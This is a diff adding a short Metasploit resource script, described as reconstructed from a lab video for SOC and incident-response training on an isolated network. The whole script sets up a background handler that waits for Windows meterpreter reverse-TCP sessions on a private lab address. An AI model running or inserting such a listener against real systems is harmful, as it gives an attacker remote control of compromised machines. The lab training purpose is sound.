@@ -1,0 +1,8 @@
+# Metasploit Resource Script - Reconstructed from Lab Demonstration (Demo_Full.mp4)
+# Purpose: Educational SOC & Incident Response Simulation in Isolated VMware Host-Only Network
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.23.130
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
